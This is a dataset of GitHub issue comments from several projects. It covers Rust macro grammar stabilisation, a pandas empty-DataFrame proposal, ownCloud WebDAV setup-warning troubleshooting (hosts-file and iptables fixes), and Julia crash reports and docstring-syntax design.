rust/rust-lang/41022/371534759,41022,"@friend Sorry if I came off too blasé. I'm mostly just embittered with the situation, which I find quite frustrating -- we foresaw the problem, but our solution just didn't work. It annoys me, in part because the simpler solution that we originally had in mind would have worked fine. =) But clearly we are not going to allow this to stop us from modifying our grammar. I hope we can address in Macros 2.0 by changing how fragments work. As far as I know roughly the only scheme that works is to have  consume all token trees until something from the designated ""follow set"" of  is found, and then try to parse those tokens as a , and error if extra tokens are left over. But that's a topic for another thread I suppose. I think it's reasonable. ",,False
rust/rust-lang/41022/407896093,41022,"@friend Now that we've come closer to finalizing the modules system under the 2018 edition, do you feel more comfortable resolving your concern here? ",,False
rust/rust-lang/41022/408330588,41022,"@friend resolved if we make further changes to the visibility modifiers as we continue to evolve the module system, will this cause back compat issues here? (Assuming that  will match  like ) ",,False
rust/rust-lang/41022/408330594,41022,"bell This is now entering its final comment period, as per the review above. bell ",,False
rust/rust-lang/41022/410608447,41022,"The final comment period, with a disposition to merge, as per the review above, is now complete. ",,False
rust/rust-lang/41022/412674723,41022,This is in need of a stabilization PR! There's a stabilization guide on the forge. Please post here if you plan to take this issue! (I'll circulate it around and see if anyone wants to take it as a good first or third PR) ,,False
rust/rust-lang/41022/412676186,41022,"@friend as discussed, I would like to try my hand at doing the stabilisation PR. Will ping if I get stuck ",,False
rust/rust-lang/41022/421560504,41022,"This has been stabilized and the reference has been amended, so this seems done. ",,False
rust/rust-lang/41022/454071121,41022,"I'm popping in here while trying to more fully document the follow-set rules in the reference, and the  discussion above doesn't quite make sense to me. Was the intent to exclude  from the follow-set of ? Because it is currently in it---both because  has  and because  is an identifier other than non-raw . ",,False
pandas/pandas-dev/9216/53822681,9216,"After hours of tearing my hair, I've come to the conclusion that it is impossible to create a mixed dtype DataFrame without copying all of its data in. That is, no matter what you do, if you want to create a mixed dtype DataFrame, you will inevitably create a temporary version of the data (e.g. using np.empty), and the various DataFrame will constructors will always make copies of this temporary. This issue has already been brought up, a year ago  is especially terrible for interoperability with other programming languages. If you plan to populate the data in the DataFrame from e.g. a call to C, the easiest way to do it by far is to create the DataFrame in python, get pointers to the underlying data, which are np.arrays, and pass these np.arrays along so that they can be populated. In this situation, you simply don't care what data the DataFrame starts off with, the goal is just to allocate the memory so you know what you're copying to. This is also just generally frustrating because it implies that in principle (depending potentially on the specific situation, and the implementation specifics, etc) it is hard to guarantee that you will not end up using twice the memory you really should. This has an extremely simple solution that is already grounded in the quantitative python stack have a method analagous to numpy's empty. This allocates the space, but does not actually waste any time writing or copying anything. Since empty is already taken, I would propose calling the method from_empty. It would accept an index (mandatory, most common use case would be to pass np.arange(N)), columns (mandatory, typically a list of strings), types (list of acceptable types for columns, same length as columns). The list of types should include support for all numpy numeric types (ints, floats), as well as special Pandas columns such as DatetimeIndex and Categorical. As an added bonus, since the implementation is in a completely separate method, it will not interfere with the existing API at all. ",,False
pandas/pandas-dev/9216/352890655,9216,There are many many threads on SO asking for this feature. It seems to me that all these problem stem from BlockManager consolidating separate columns into a single memory chunks (the 'blocks'). Wouldn't the easiest fix be to not consolidate data into blocks when copy=False is specified. I have a non-consolidating monkey-patched BlockManager    I used to work around this problem. ,,False
core/owncloud/2495/12266128,2495,"By connecting to admin account and access to ""Admin"" screen, the following warning is shown Setup Warning Your web server is not yet properly setup to allow files synchronization because the WebDAV interface seems to be broken. Please double check the installation guides. I have this message after an installation with the web-installer. I'm sorry but it still an issue (not resolve as   After an automatic installation, have this kind of message who refer to the manual installation ( in not helpfull for non-developer users. Moreover, the alert don't give enough information to understand what is the trouble. ",,False
core/owncloud/2495/15226908,2495,Please read the contribution guidelines ;) ,,False
core/owncloud/2495/15229808,2495,"INSTALL 1  Operating system   Linux mini 3.2.0-39-powerpc-smp #62-Ubuntu Web server apache2 Database sqlite PHP version 5.3    version 5.0.0 isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception_NotImplemented' with message 'Not Implemented' in /var/www/cloud/3rdparty/Sabre/DAV/Client.php436 Stack trace #0 /var/www/cloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /var/www/cloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /var/www/cloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /var/www/cloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/cloud/...') #4 [internal function] __lambda_func(Array) #5 /var/www/cloud/lib/router.php(127) call_user_func('?lambda_131', Array) #6 /var/www/cloud/lib/base.php(606) OC_Router-&gt;match('/settings/admin') #7 /var/www/cloud/index.php(28) OChandleRequest() #8 {main} full   2  i tryed here with https and self signed certificate Operating system   Linux apache-11c.w4a.fr 2.6.32-379.22.1.lve1.2.12.el6.x86_64 Web server apache2 Database mysql PHP version 5.3 more info   version 5.0.0 isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request Peer certificate cannot be authenticated with known CA certificates (error code 60)' in /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php412 Stack trace #0 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/lib/route.php(113)  runtime-created function(1) require_once('/datas/vol2/w4a...') #4 [internal function] __lambda_func(Array) #5 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/lib/router.php(127) call_user_func('?lambda_49', Array) #6 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/lib/base.php(606) OC_Router-&gt;match('/settings/admin') #7 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/index.php(28) OChandleRequest() #8 {main}   21.03.2013 1132 Warning PHP curl_setopt_array() [&lt;a href='function.curl-setopt-array'&gt;function.curl-setopt-array&lt;/a&gt;] CURLOPT_FOLLOWLOCATION cannot be activated when safe_mode is enabled or an open_basedir is set at /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php#464 full  on both install, with same server config, all was worked fine with 4.5* version. Now, sync is impossible with client due to this issue ",,False
core/owncloud/2495/15231343,2495,Looks like safe_mode is enabled - please disable that ♠` Warning PHP curl_setopt_array() [function.curl-setopt-array] CURLOPT_FOLLOWLOCATION cannot be activated when safe_mode is enabled or an open_basedir is set at /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php#464 ,,False
core/owncloud/2495/15231396,2495,Second What version number is in your 3rdparty/Sabre/DAV/Version.php ,,False
core/owncloud/2495/15231621,2495,"The sabre version is  '1.7.5' on install 2, it is a mutualized server; i cannot disable safe_mode ",,False
core/owncloud/2495/15232029,2495,generally speaking ownCloud cannot run in safe_mode ,,False
core/owncloud/2495/15232107,2495,"I'm sorry, i just rechecked safe_mod is off on both install  (as we can see here   &amp; ",,False
core/owncloud/2495/15232207,2495,the curl warning is telling a different story ;-) ,,False
core/owncloud/2495/15233579,2495,open_basedir can also be the problem ,,False
core/owncloud/2495/15243265,2495,"I am also having problem but for MacOSX 1.2.1 Client  is disabled for current user, safe_mode is off ",,False
core/owncloud/2495/15257787,2495,"I had the same error, but for me the reason was quite obscure. My webserver is a guest running on private ip address that is NAT'ed at the hosts external interface. A connection from the guest to the public one is ""refused"" so the guest is not able to curl it's own url. Quick fixed by adding a host entry to the private address in /etc/hosts. Need to investigate further why the guest can not connect to the public address (iptables). ",,False
core/owncloud/2495/15257866,2495,btw The warning I had was isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request couldn't connect to host (error code 7)' ,,False
core/owncloud/2495/15258625,2495,This at the end means your setup is not proper to allow WebDAV and sync clients to work without issues. Fix the setup -&gt; fix webdav and have fun with syncing. Generally speaking the webdav test we have incorporated will give you hints that your web server setup is not proper. We cannot solve all your setup issues and we cannot foresee all configuration combinations. The details error message is always int the logs - we try to help out as good as we can. There are cases where we most probably produce false positives - we will fix this if possible. ,,False
core/owncloud/2495/15294265,2495,"My situation appears similar (identical?) to what mrvanes reported. My ownCloud server is NATed with a high port mapped to 443, i.e. connecting to  port forwards to  on my LAN. If I connect to the LAN address, e.g.  I do NOT get the error message. If I connect to the WAN address, I do. ",,False
core/owncloud/2495/15507670,2495,"when entering administrator page it says that there is something wrong with the webdav interface and i should consider instructions manual for solving the issue. i double checked, here is everything correct - at least depending on those written in that specifiy manual. webdav also works (syncing at least works) so we may talk about false detection of owncloud. owncloud itself throws this &lt;code&gt; sWebDAVWorking NO - Reason exception 'InvalidArgumentException' with message 'The passed data is not valid XML' in /var/www/slc/htdocs/cloud/3rdparty/Sabre/DAV/Client.php531 Stack trace 0 /var/www/slc/htdocs/cloud/3rdparty/Sabre/DAV/Client.php(181) Sabre_DAV_Client-&gt;parseMultiStatus(false) 1 /var/www/slc/htdocs/cloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) 2 /var/www/slc/htdocs/cloud/settings/admin.php(34) OC_UtilisWebDAVWorking() 3 /var/www/slc/htdocs/cloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/slc/ht...') 4 [internal function] __lambda_func(Array) 5 /var/www/slc/htdocs/cloud/lib/router.php(127) call_user_func('?lambda_908', Array) 6 /var/www/slc/htdocs/cloud/lib/base.php(606) OC_Router-&gt;match('/settings/admin') 7 /var/www/slc/htdocs/cloud/index.php(28) OChandleRequest() 8 {main} &lt;/code&gt; to avoid any silly thoughts like safe_mode on or maybe set open_basedir. both are def. OFF or unset. (safe_mode off and open_basedir isnt set). also to prevent talkings about missing php capabilities im offering for a short time phpinfo ( i understand the defending attitude of developers sometimes because nobody wants to hear something ""bad"" about his ""baby"", but i want to remind that many ppl (look into owncloud board) reported/verified that ""bug"" who have upgraded ONLY owncloud (and didnt touch php or the environment at all). so i would suggest we focus on finding the dirty lil mistake somewhere in the source. ) if you need more information related to php, backend stuff u actually using in your source or may some requirements which are not enlisted in the installation manual, gimme a notice! D best regards Simon PS just edit the ""code"" section for better reading. ",,False
core/owncloud/2495/15643887,2495,"I had similar problem. This is because of dynamic dns use. To solve it, simply modify your /etc/hosts file     127.0.0.1 ",,False
core/owncloud/2495/15644519,2495,"why should a working network setup be responsible for development mistakes? and why should anyone modifying a working network setup to a wrong configured one because of ONE piece of php code? oO Thanks for the idea, but its not a solution. i prefer the devs do fix this asap among other bugs. ",,False
core/owncloud/2495/15684201,2495,"I think I had the same problem  webDav warning in Admin Panel unable to sync with desktop or iPhone client  I think I had the wrong php modules installed or something was missing, because this resolved the problem! the output was this ",,False
core/owncloud/2495/15690303,2495,"well im capable syncing, and i do meet the written requirements. no need to blindly install any modules. If you name a particular extension they may ""need"" i can check if i have it enabled or not and may add it to the configuration. blindly installing modules is unprofessional. ",,False
core/owncloud/2495/15691876,2495,I know that the solution for my problem is not professional. I am not a professional. But I had luck. So I hope that someone (a developer) may extract some usefull information out of my post to get an solution for the problem. ,,False
core/owncloud/2495/15810605,2495,"I upgraded from 4.7 to 5.02 using the upgrade app. Prior to the upgrade my system had no issues. At this point my admin page has the following line at the top of the page Your web server is not yet properly setup to allow files synchronization because the WebDAV interface seems to be broken.    Please double check the installation guides. File synchronization is working however, and so is the Owncloud app on my Android tablet. The log messages at the bottom of the page show Error    core    storage backend \OC\Files\Storage\Dropbox not found     April 2, 2013 1934 Not sure what the Dropbox error is about since I am not using the External Storage app, it's disabled. ",,False
core/owncloud/2495/15895573,2495,"I also upgraded from 4.8 to 5.03. With Login https.//myserver444 I have the following warning ""Einrichtungswarnung Dein Web-Server ist noch nicht für Datei-Synchronisation bereit, weil die WebDAV-Schnittstelle vermutlich defekt ist."" Output log isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request couldn't connect to host (error code 7)' in /var/www/html/owncloud/3rdparty/Sabre/DAV/Client.php410 Stack trace #0 /var/www/html/owncloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /var/www/html/owncloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /var/www/html/owncloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /var/www/html/owncloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/html/o...') #4 [internal function] __lambda_func(Array) #5 /var/www/html/owncloud/lib/router.php(127) call_user_func('?lambda_789', Array) #6 /var/www/html/owncloud/lib/base.php(608) OC_Router-&gt;match('/settings/admin') #7 /var/www/html/owncloud/index.php(28) OChandleRequest() #8 {main} Clientsync and Webdav works. With Login  have no warning! ",,False
core/owncloud/2495/15964401,2495,"I have the same issue in OC5.0 on my local setup. I use WinXP, Nginx 1.0.12, PHP 5.4.3, MySQL 5. I 've perform some debug of this situation and I found that Sabre DAV Server wait for Authentification header from Sabre DAV Client then it try to connect to server in function isWebDAVWorking() from lib/util.php. But I didn't found any place there Authorization header was sent. I didn't seen the setup warning like in first message, I just seen 504 error instead of it. The $_SERVER['HTTP_AUTHORIZATION'] variable is empty.  Could somebody explain how should work Sabre DAV Server in this case? ",,False
core/owncloud/2495/15981716,2495,"Hello I had all the errors above too. I finally got it to work, so the welcome screen to download the app appears without giving an error. How to fix the problem sWebDAVWorking NO - Reason exception 'InvalidArgumentException' with message 'The passed data is not valid XML' in /var/www/slc/htdocs/cloud/3rdparty/Sabre/DAV/Client.php531 Open the file /var/www/owncloud/remote.php got to the last line and change require_once to require Also i add in the /etc/hosts my used dynamic domain to the localhost 127.0.0.1. I added the entry to the host file because my router has a ""nice feature"" it routes all internal requests to my public dynamic ip to the router..... Maybe this helps. ",,False
core/owncloud/2495/15989060,2495,I am still have no idea what things makes this WebDAV failed after all of necessary actions is taken  disable all other DAV server like in cPanel disable webdisk webdav mod rewrite on open_basedir are disabled from both apache and php safe_mode is off disable firewall for test  note for a2enmod in owncloud documentation should be marked as 'debian or ubuntu' command. ,,False
core/owncloud/2495/16238902,2495,"I only get the message, when i am using https to connect to my owncloud instance ... i would like to use https, but it seems not to work correctly ( ",,False
core/owncloud/2495/16239067,2495,"@friend please send a pull request to the documentation repo, its really easy to do ;) ",,False
core/owncloud/2495/16353222,2495,"The same problem here. And I have this in my warning log file isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request couldn't connect to host (error code 7)' in /var/www/html/cloud/3rdparty/Sabre/DAV/Client.php410 Stack trace #0 /var/www/html/cloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /var/www/html/cloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /var/www/html/cloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /var/www/html/cloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/html/c...') #4 [internal function] __lambda_func(Array) #5 /var/www/html/cloud/lib/router.php(127) call_user_func('?lambda_8', Array) #6 /var/www/html/cloud/lib/base.php(608) OC_Router-&gt;match('/settings/admin') #7 /var/www/html/cloud/index.php(28) OChandleRequest() #8 {main} ",,False
core/owncloud/2495/16431678,2495,@friend your problem is that your webserver can't connect to itself ,,False
core/owncloud/2495/16572877,2495,"Same problem too. My warning log file says  isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request Failed connect to host; Connection timed out (error code 7)' in /var/www/localhost/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php410 Stack trace #0 /var/www/localhost/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /var/www/localhost/htdocs/owncloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /var/www/localhost/htdocs/owncloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /var/www/localhost/htdocs/owncloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/localh...') #4 [internal function] __lambda_func(Array) #5 /var/www/localhost/htdocs/owncloud/lib/router.php(127) call_user_func('?lambda_256', Array) #6 /var/www/localhost/htdocs/owncloud/lib/base.php(608) OC_Router-&gt;match('/settings/admin') #7 /var/www/localhost/htdocs/owncloud/index.php(28) OChandleRequest() #8 {main} OS  Linux Gentoo webserver  lighttpd ",,False
core/owncloud/2495/17138160,2495,"I had the same situation as mrvanes and steveAliff.  My ownCloud server is NATed with a high port mapped to 443, i.e. connecting to  port forwards to  on my LAN. Add a line to /etc/hosts 127.0.0.1 myserver.realdomain and execute the iptables command &lt;code&gt; \# iptables -t nat -A OUTPUT -p tcp --dport 8888 -j DNAT --to 127.0.0.1443 &lt;/code&gt; ",,False
core/owncloud/2495/17686274,2495,"Hello everyone, who is getting this issue. I've realized, that the strange warning message appears if I use the domain name instead of the IP address (I don't use any forwarding).  to if I change the address as follows  message disappears. So I hope the information will help. ",,False
core/owncloud/2495/19854602,2495,I added 'overwritehost' =&gt; '192.168.1.1' into config/config.php $CONFIG array and the message disapeard. Be sure to check if you're behind a NAT like me and whats your internal server address. Here's where I got the tip ,,False
core/owncloud/2495/22332842,2495,I’m closing this issue because it has been inactive for a few months. This probably means that the issue is not reproducible or it has been fixed in a newer version. Please reopen if you still encounter this issue with the latest stable version (currently ownCloud 5.0.9) and then please use the issue template. You an also contribute directly by providing a patch – see the developer manual. ) Thank you! ,,False
core/owncloud/2495/22837163,2495,"I am using 5.0.10 and the issue is still present. But in my case, I was able to resolve it by fixing my firewall, which runs on the same machine as the server. I already posted the finding somewhere else but essentially, the server is doing an access to itself using its external IP address (i.e. not 127.0.0.1) . If the situation is not allowed by iptables, then the server will time out and eventually serve the page to the browser albeit after a long time...... ",,False
core/owncloud/2495/23160177,2495,So what’s the plan of action here? ,,False
core/owncloud/2495/24860257,2495,"I came across this too while doing a test-drive install in a VM. The problem was of course with my VM setup. (I used faux vhost name in Apache to mount ownCloud, but forgot to add a corresponding entry in the VM's /etc/hosts, i only had the entry in my bare metal machine's /etc/hosts.) Could you guys add the URL of your test request to the message? If it was present, i'd immediately realize what's going on. Currently it's not visible what kind of check you perform, so it's not obvious how to debug the problem. E.g. Your web server is not yet properly setup to allow files synchronization because the WebDAV interface seems to be broken -- request to "" failed. Please double check the installation guides. ",,False
core/owncloud/2495/24864380,2495,"@friend Actually the url that we test shoudn't be important. If you would ""fix"" to this url that you would hide the warning but ownCloud wouldn't work correctly in general because a lot of other services on the internet are still not working. This is the whole point of this warning.  I still think that this warning shoud be shown if full internet access ist not working. This is a feature and not a bug. ",,False
core/owncloud/2495/24864407,2495,@friend So this warning helped you to fix a bug in your firewall. I still think that this warning is a useful feature and not a bug. ,,False
core/owncloud/2495/24866210,2495,"@friend Yeah absolutely, the warning helped me fix a configuration issue with my VM. It's very useful. My point was that if that warning conained a bit more info, i'd realize what's the problem a bit sooner. Just sayin' ) ",,False
core/owncloud/2495/36419112,2495,"I had the same error messages as OP, turns out ownCloud does some requests with empty user agent (bad habit?) and my modsec rules didn't like that so they got blocked. Running pretty much standard OWASP rules. Just adjust them or comment them and error message is gone. ",,False
core/owncloud/2495/53950610,2495,"Hi, I'm not sure this should be closed.  The only way I could get the message to disappear on Windows server was to ensure 127.0.0.1 pointed to the website OwnCloud was running on.  That is, in IIS select the site you have OC installed on, open the bindings, Add a new binding with the following values Type http IP Address All assigned Port 80 Host name  (Host name blank) The problem with this approach is it requires the owncloud site to be set to 127.0.0.1. If you run a local  web app on 127.0.0.1, it is no longer available on the same machine as OC. Is it possible to ensure the webdav check using the OC sitename? ",,False
julia/JuliaLang/23605/255687670,23605,"Reproduces 100% of the time for me [fatal] This is also 100% reproducible, but you must type each line after line 2 to get the same output [strange] ",,False
julia/JuliaLang/23605/327561351,23605,"Well, if you overwrite critical function incorrectly that's exactly what should happen. ",,False
julia/JuliaLang/23605/327572992,23605,"Not sure I agree with your claim that that is what exactly what should happen.  I think you mean ""we don't prevent users from overwriting critical functions; doing so may result in gibberish"". Is that the approach being taken with the language in general? ",,False
julia/JuliaLang/23605/327575444,23605,"We tend to be permissive, but speaking in such general terms is not really useful. It would be very simple to make it an error to overwrite methods in , for example. It just hasn't seemed very urgent in practice. ",,False
julia/JuliaLang/23605/327592038,23605,"Ok, thanks for clarifying. ",,False
julia/JuliaLang/23605/327613787,23605,"Here's another piece of code, this time resulting in a segfault.  Is this also in the camp of ""don't write stupid code""? ♠Set{Array{T}}() where {T&lt;Float64}` [segfault] I guess I'm not that clear on what type of crashes are worth reporting given that the code is not supposed to work. ",,False
julia/JuliaLang/23605/327614378,23605,None of overwrite base function causing crash are worth reporting. All of other segfaults/hard crashes that's not obviously using unsafe features are worth reporting and  does look like it should have a better error. ,,False
julia/JuliaLang/23605/327619012,23605,"@friend We always appreciate bug reports and you should always report any possible issue you run into. Different cases are different. Even if two problems have the same underlying cause that is often not obvious at first. In this case, IIUC, the original problem report did not involve a segfault, whereas your new example does. In any case we absolutely do not take the attitude that nothing is supposed to work and so bug reports are futile. That is not a terribly productive inference to make. ",,False
julia/JuliaLang/23605/327646970,23605,"Ok, thanks.  I'll keep reporting then and you guys can ignore at your leisure if i report something that's a known philosophical issue.  Let me know if you want me to open a separate issue for the segfault. ",,False
julia/JuliaLang/23605/327647096,23605,Please do. ,,False
julia/JuliaLang/23605/327662423,23605,"@friend, there's a notion of ""type piracy"" which not everyone buys into, but if you do not commit type piracy, you are definitely in the clear in the sense of ""your code should not crash Julia"" type piracy is adding a method to a function that doesn't ""belong"" to you for arguments where none of the argument types ""belong"" to you. Or conversely, you are not committing an act of piracy if the function or one of the argument types belongs to you – in other words, you can be certain that what you define cannot conflict with anyone else. In this case, redefining very basic operations like integer comparison is very much type piracy the  operator and the type  belong to Base (i.e. everyone), so changing what  means is going to mess with everything. If you want to define your own  operator which has different behavior, just don't qualify the overload. You can even do so with a fallback to call . ",,False
julia/JuliaLang/23605/327671545,23605,"Just to clarify that type piracy is a concept that is related although not a requirement for overwriting low level/ fundamental Base functions. There are other Base functions that you can overwrite for your own types that can cause low level operations involving your type to crash in a bad way. You can get this effect easily with type reflection functions, e.g. There's no type piracy involved here but it's in the same class as overwriting  (i.e. this code ""should"" crash julia). In both cases, Base code assumes certain functions to behave correctly and overwriting them can cause huge trouble. ",,False
julia/JuliaLang/8514/44292000,8514,Some good discussion started here. This is to more formerly track integrating the necessary parts into Base since it seems some good consensus is building. @friend @friend ,,False
julia/JuliaLang/8514/57187758,8514,I'd be happy to get going on this. Also pinging @friend since he's be the source of some great input here. I'll put together a PR over the next few days. ,,False
julia/JuliaLang/8514/57188831,8514,Also pinging @friend who originally suggested to me about Docile.jl as a good starting point. Also @friend has been looking for this. ,,False
julia/JuliaLang/8514/57191289,8514,@friend I recommend waiting until I've worked through overhauling Markdown.jl before finalising anything / setting up PRs. There will probably be some technical changes to work out within Docile/Markdown to get the string macros etc. working smoothly. ,,False
julia/JuliaLang/8514/57191466,8514,"Yes, just saw your  branch. I'll wait on your changes. ",,False
julia/JuliaLang/8514/57198663,8514,"Docile does look quite good. I'm wondering about  Maybe we should add some special syntax to avoid the  How much can we cut down the dependencies?  For point (2), I feel the system should be as lazy as possible, just populating metadata with strings until interaction and display happen. ",,False
julia/JuliaLang/8514/57201717,8514,"Special syntax would be nice. The  is providing the  that I'm using to get file and line numbers for metadata. Would be great to retain that info. Docile doesn't really have any dependencies, it's just harvesting strings and metadata. Lexicon's providing the presentation layer. I agree about the laziness -- I don't have any hard numbers, but when I was parsing docstrings during  package loading was quite a bit slower. ",,False
julia/JuliaLang/8514/57205775,8514,"Another thing that needs to be hashed out is what non-standard form of markdown we wish to support.  Inline latex, tables, and cross references seem necessary. ",,False
julia/JuliaLang/8514/57206612,8514,"@friend CommonMark [1, 2] looks reasonably promising. Inline math is a must-have feature  -- not sure whether that would be part of the spec though. [1]  ",,False
julia/JuliaLang/8514/57207138,8514,"HttpServer now uses Docile (thanks to @friend), which could be another interesting case study ",,False
julia/JuliaLang/8514/57207454,8514,"That's cool, thanks @friend. Guess I can't make breaking changes now! ",,False
julia/JuliaLang/8514/57209268,8514,I think this is the right way to go. I agree with Jeff's point that special syntax would make Docile nicer to work with. ,,False
julia/JuliaLang/8514/57217225,8514,"CommonMark doesn't have any standard for embedded equations; see this discussion.   Pandoc's  + heuristic (opening $ can't be followed by whitespace, closing $ can't be followed by a digit or preceded by whitespace) seems like the most widely used at this point, and is what is used in Jupyter/IJulia. ",,False
julia/JuliaLang/8514/57218272,8514,My understanding in #3988 was always that there would eventually be a special syntax for this; macros are only for prototyping. ,,False
julia/JuliaLang/8514/57270533,8514,"Was syntax ever agreed upon for this? Something along the lines of Where  is a new keyword whose ending keyword is , ,  etc. Or just without the  at all and any unassigned string above a documentable block of code is taken to be a docstring? ",,False
julia/JuliaLang/8514/57271405,8514,"Jeff and I just talked about this today and a bare string literal in void context followed by a definition seems like the way to go. This should be lowered by the parser something like this becomes the moral equivalent of this Important points about this approach  parsing has no side-effects – the construction of the documentation structure still occurs when the code is actually evaluated, not when it is parsed. each module has its own  dictionary; this is important for reloading modules. This ends up just appending all the docs for a given name, including separate doc strings for a single generic function.  An open issue is how to handle adding methods to functions from other modules. Does the definition go into the current module's  dict? What symbol is used for the doc key then? ",,False
julia/JuliaLang/8514/57279662,8514,Just to comment that it's super-exciting to see momentum on this. Looking forward to seeing what emerges. ,,False
julia/JuliaLang/8514/57291521,8514,"Is using  as the key type a necessary requirement? Does doing this not restrict the kind of things that can be documented -- namely individual s of a ? If is instead translated to then you could use the / etc as the key instead of a  -- some adjustments to the -block not shown. Is this approach feasible? For adding docs to methods that are being extended from those in a different module, I'd be in favour of adding them to the current module's . I'd find it a bit odd if the docs I write for a method end up in a different module. ",,False
julia/JuliaLang/8514/57297121,8514,"Stefan's proposal looks good to me, but plus one for being either being aware of methods properly or being limited to one docstring per function (as opposed to concatenating each successive dosctring regardless). Another way to do this might be something like i.e. indexing doc strings by type as well as name. Key points in this approach  The redefinition problem is handled at the function level rather than the module level, which means that Redefining functions/methods works in a sane way, as opposed to endlessly concatenating onto the existing doc string This will automatically make reloading modules do the expected thing too, so a module-local  isn't necessary to solve that problem (though it might be useful for other reasons)   It removes the dependency on the order of definitions. So you could do fancy things like making more doc strings for more general methods appear first.  (1.i) is my main concern – redefining functions messing up their own docs is something we could probably live with / work around / ignore, but if we can solve this early it will make for a much better interactive experience, I think. ",,False
julia/JuliaLang/8514/57306583,8514,"Key problems with this approach  As discussed elsewhere (e.g. MichaelHatherly/Docile.jl#29), there is no need for documentation objects to be a string; they can be any Julia object with the appropriate  methods.   e.g. imagine a documentation object like .  A  keyword allows more generality here.   Docile currently allows additional metadata to be stored in the documentation, e.g.  Docile currently allows  vs.  in order to distinguish documentation for a  in general vs. documentation for a .  One possibility would be to make the  keyword optional for string literals (including string macros like ), but to allow it for more complicated documentation. ",,False
julia/JuliaLang/8514/57312394,8514,"Documentation specific to argument signature is definitely better than concatenation, plus one for documentation being anything with a  method. A transformation like would also let us evaluate documentation objects only when they are needed. e.g.  could call the closure and cache the result. ",,False
julia/JuliaLang/8514/57322628,8514,"I know that this is probably not a popular opinion but I really think we should consider using Restructured Text at least for the default markup in Base.   It supports everything we will want (inline math / code, cross-links, tables, etc.), supports extensions in the standard for functionality we would want to add, and would allow us to reuse all the tooling in developed in the Python world (Sphinx, ReadTheDocs, etc.) which imo is the best out there. Otherwise I see us developing yet another superset of Markdown to support our needs which may or may not be consumable by other tools.  I guess if we pick a superset with better tooling support (such as PanDoc markdown with all the extensions) we might be able to mitigate this problem. ",,False
julia/JuliaLang/8514/57324678,8514,"These are good points. Having an API for this is key, as that will allow even more flexibility than a keyword. For fancy documentation needs, use the API instead of the special syntax. It's probably also true that we'll want to associate docs with particular type signatures. I think associating arbitrary metadata with every docstring is overengineering at this point. Where we are, we can't even ask for help for a simple function in a package. ",,False
julia/JuliaLang/8514/57324811,8514,"ReStructured Text is awful. I wrote most of the original manual and writing it in Markdown was a pleasure. Writing documentation has been a painful chore ever since we switched from Markdown to RST. Having complicated formatting types for documentation is overkill and something that we can consider, if at all, only if there's strong evidence of a real need in practice. I don't think there will be any such need. There should be essentially no choice about documentation – the worst possible situation is one where everyone writes docs in their personal favorite format and there are a dozen of them. There should be one reasonable way to write docs that works well and that everyone is familiar with. What we generate during parsing should be simple and easy for the parser to construct – i.e. just strings – and these strings should look decent if you just show them as is. Markdown fits the bill perfectly – it is already (by design) how people intuitively markup plain text content. ",,False
julia/JuliaLang/8514/57324828,8514,"@friend, as I've discussed in the abovementioned Docile issue, the plan for typical documentation objects (e.g. Markdown text) is to store only the unparsed string when the file is loaded.  Parsing of the AST, generation of HTML, etcetera, is only performed ""lazily"" when the help is requested in some format. @friend, the choice of format is orthogonal to this feature if my suggestion is adopted.   Markdown documentation would be  (creating a  object), Restructured Text would be  (creating a  object), etc.  Each would have appropriate  methods to generate text/html, text/latex, or whatever.   We can argue about what format should be used in Base elsewhere. ",,False
julia/JuliaLang/8514/57325174,8514,"@friend, we absolutely have to have some kind of metadata if you want to have any possibility of generating offline documentation, because you can't just have a long list of 3000 functions in Base, sorted alphabetically.  At the very least, you have to be able to mark what section and subsection of the manual they should appear in. ",,False
julia/JuliaLang/8514/57325366,8514,Let's cross that bridge when we get there. ,,False
